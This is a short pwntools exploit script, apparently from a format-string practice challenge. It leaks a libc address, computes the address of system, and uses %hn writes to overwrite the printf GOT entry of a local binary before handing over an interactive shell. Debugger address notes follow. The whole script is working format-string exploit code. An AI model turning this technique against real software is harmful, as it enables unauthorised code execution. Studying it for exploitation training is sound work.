#!/usr/bin/env python
from pwn import *


printf_got = 0x000000601030

#arb read, get printf addr
p = process("./fs-code-exec-64")
p.sendline("%9$p")
random_libc = int(p.recv().split()[6],16)
printf_libc = random_libc - 3624792
system_libc = printf_libc - 66672
#arb write: take printf[:9] + system[9:13] + printf[13:] ->> printf

str1 = str(int("0x" + hex(system_libc)[-4:],16))
str2 = str(int("0x"+hex(system_libc)[6:10],16) - int("0x"+hex(system_libc)[-4:],16))
#str3 = str(int(hex(system_libc)[:6],16) - int("0x"+hex(system_libc)[6:10],16))
num1 = "9"
num2 = "10"

"""
num1 = "11"
num2 = "12"
num3 = "13"
"""

string = "%" + str1 + "x%" + num1 + "$hn%" + str2 + "x%" + num2 + "$hn"
#string += "%" + str3 + "x%" + num3 + "$n"
string += "" + p64(0x601030) + p64(0x601032) #+ p64(0x601034)


p.sendline(string)
p.interactive()

print("system --> " + str(hex(system_libc)))
print("printf --> " + str(hex(printf_libc)))
print(len(string))


"""
pwndbg> print printf
$1 = {<text variable, no debug info>} 0x7f320f47c800 <__printf>
pwndbg> print system
$2 = {<text variable, no debug info>} 0x7f320f46c390 <__libc_system>

0x0769c390 / 0x7fb735a7c390

"""
